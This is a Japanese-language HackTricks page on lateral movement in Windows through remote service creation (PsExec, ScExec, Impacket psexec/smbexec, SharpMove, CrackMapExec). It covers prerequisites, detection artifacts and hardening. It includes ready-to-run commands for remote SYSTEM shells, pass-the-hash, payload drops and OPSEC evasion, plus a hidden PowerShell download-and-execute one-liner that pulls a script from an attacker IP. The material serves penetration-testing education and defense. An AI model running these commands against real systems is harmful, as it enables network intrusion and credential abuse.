# PsExec/Winexec/ScExec/SMBExec

{{#include ../../banners/hacktricks-training.md}}

## どのように機能するか

これらの技術は、SMB/RPCを介してリモートでWindowsサービスコントロールマネージャー（SCM）を悪用して、ターゲットホスト上でコマンドを実行します。一般的な流れは次のとおりです。

1. ターゲットに認証し、SMB（TCP/445）経由でADMIN$共有にアクセスします。
2. 実行可能ファイルをコピーするか、サービスが実行するLOLBASコマンドラインを指定します。
3. SCM（\PIPE\svcctl経由のMS-SCMR）を介して、そのコマンドまたはバイナリを指すリモートサービスを作成します。
4. サービスを開始してペイロードを実行し、オプションで名前付きパイプを介してstdin/stdoutをキャプチャします。
5. サービスを停止し、クリーンアップ（サービスとドロップされたバイナリを削除）します。

要件/前提条件：
- ターゲット上のローカル管理者（SeCreateServicePrivilege）またはターゲット上の明示的なサービス作成権限。
- SMB（445）が到達可能で、ADMIN$共有が利用可能；ホストファイアウォールを通じてリモートサービス管理が許可されている。
- UACリモート制限：ローカルアカウントを使用する場合、トークンフィルタリングによりネットワーク上の管理者がブロックされる可能性があるため、組み込みのAdministratorまたはLocalAccountTokenFilterPolicy=1を使用する必要があります。
- Kerberos対NTLM：ホスト名/FQDNを使用するとKerberosが有効になり、IPで接続するとNTLMにフォールバックすることが多く（強化された環境ではブロックされる可能性があります）。

### sc.exeを介した手動ScExec/WinExec

以下は、最小限のサービス作成アプローチを示しています。サービスイメージは、ドロップされたEXEまたはcmd.exeやpowershell.exeのようなLOLBASである可能性があります。
```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```
ノート:
- 非サービスEXEを起動するときにタイムアウトエラーが発生することがありますが、実行は続行されます。
- よりOPSECフレンドリーであるために、ファイルレスコマンド(cmd /c, powershell -enc)を好むか、ドロップされたアーティファクトを削除してください。

詳細な手順については、こちらを参照してください: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/

## ツールと例

### Sysinternals PsExec.exe

- SMBを使用してADMIN$にPSEXESVC.exeをドロップし、一時サービス（デフォルト名PSEXESVC）をインストールし、名前付きパイプを介してI/Oをプロキシするクラシックな管理ツールです。
- 使用例:
```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```
- WebDAV経由でSysinternals Liveから直接起動できます:
```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```
OPSEC
- サービスのインストール/アンインストールイベントを残し（サービス名は通常PSEXESVC、-rが使用されない限り）、実行中にC:\Windows\PSEXESVC.exeを作成します。

### Impacket psexec.py (PsExecに似たもの)

- 埋め込まれたRemComのようなサービスを使用します。ADMIN$経由で一時的なサービスバイナリ（一般的にランダム化された名前）をドロップし、サービスを作成します（デフォルトは通常RemComSvc）し、名前付きパイプを介してI/Oをプロキシします。
```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```
Artifacts
- 一時的なEXEがC:\Windows\に作成されます（ランダムな8文字）。サービス名は上書きされない限り、デフォルトでRemComSvcになります。

### Impacket smbexec.py (SMBExec)

- cmd.exeを起動する一時的なサービスを作成し、I/Oに名前付きパイプを使用します。一般的に完全なEXEペイロードをドロップすることは避けられ、コマンド実行はセミインタラクティブです。
```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```
### SharpLateral と SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) は、サービスベースの実行を含むいくつかの横移動手法を実装しています。
```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```
- [SharpMove](https://github.com/0xthirteen/SharpMove) は、リモートでコマンドを実行するためのサービスの変更/作成を含みます。
```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```
- CrackMapExecを使用して、異なるバックエンド（psexec/smbexec/wmiexec）を介して実行することもできます：
```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```
## OPSEC、検出とアーティファクト

PsExecのような技術を使用する際の典型的なホスト/ネットワークアーティファクト：
- 管理者アカウントに対するセキュリティ4624（ログオンタイプ3）および4672（特権）。
- ADMIN$アクセスおよびサービスバイナリの作成/書き込みを示すセキュリティ5140/5145ファイル共有およびファイル共有詳細イベント（例：PSEXESVC.exeまたはランダムな8文字の.exe）。
- ターゲット上のセキュリティ7045サービスインストール：PSEXESVC、RemComSvc、またはカスタム（-r / -service-name）のようなサービス名。
- services.exeまたはサービスイメージのためのSysmon 1（プロセス作成）、3（ネットワーク接続）、11（ファイル作成）C:\Windows\内、\\.\pipe\psexesvc、\\.\pipe\remcom_*、またはランダム化された同等物のための17/18（パイプ作成/接続）。
- Sysinternals EULAのためのレジストリアーティファクト：HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1オペレータホスト上（抑制されていない場合）。

ハンティングアイデア
- ImagePathにcmd.exe /c、powershell.exe、またはTEMPロケーションを含むサービスインストールにアラートを出す。
- 親イメージがC:\Windows\PSEXESVC.exeであるプロセス作成や、LOCAL SYSTEMとしてシェルを実行しているservices.exeの子プロセスを探す。
- -stdin/-stdout/-stderrで終わる名前付きパイプや、よく知られたPsExecクローンパイプ名にフラグを立てる。

## 一般的な失敗のトラブルシューティング
- サービス作成時にアクセスが拒否される（5）：真のローカル管理者ではない、ローカルアカウントに対するUACリモート制限、またはサービスバイナリパス上のEDR改ざん保護。
- ネットワークパスが見つからない（53）またはADMIN$に接続できない：SMB/RPCをブロックするファイアウォールまたは管理共有が無効。
- Kerberosが失敗するがNTLMがブロックされる：ホスト名/FQDN（IPではなく）を使用して接続し、適切なSPNを確保するか、Impacketを使用する際にチケットと共に-k/-no-passを供給する。
- サービス開始がタイムアウトするがペイロードが実行された：実際のサービスバイナリでない場合は予想される；出力をファイルにキャプチャするか、ライブI/Oのためにsmbexecを使用する。

## ハードニングノート（現代の変更）
- Windows 11 24H2およびWindows Server 2025は、デフォルトでアウトバウンド（およびWindows 11のインバウンド）接続に対してSMB署名を要求します。これは、正当な資格情報を持つPsExecの使用を妨げることはありませんが、署名されていないSMBリレーの悪用を防ぎ、署名をサポートしないデバイスに影響を与える可能性があります。
- 新しいSMBクライアントのNTLMブロック（Windows 11 24H2/Server 2025）は、IPまたは非Kerberosサーバーへの接続時にNTLMフォールバックを防ぐことがあります。ハードニングされた環境では、NTLMベースのPsExec/SMBExecが壊れる；正当な必要がある場合はKerberos（ホスト名/FQDN）を使用するか、例外を設定する。
- 最小特権の原則：ローカル管理者メンバーシップを最小限に抑え、Just-in-Time/Just-Enough Adminを優先し、LAPSを強制し、7045サービスインストールを監視/アラートする。

## 参照

- WMIベースのリモート実行（しばしばファイルレス）：
{{#ref}}
./wmiexec.md
{{#endref}}

- WinRMベースのリモート実行：
{{#ref}}
./winrm.md
{{#endref}}



## 参考文献

- PsExec - Sysinternals | Microsoft Learn: https://learn.microsoft.com/sysinternals/downloads/psexec
- Windows Server 2025およびWindows 11におけるSMBセキュリティハードニング（デフォルトでの署名、NTLMブロック）：https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591
{{#include ../../banners/hacktricks-training.md}}
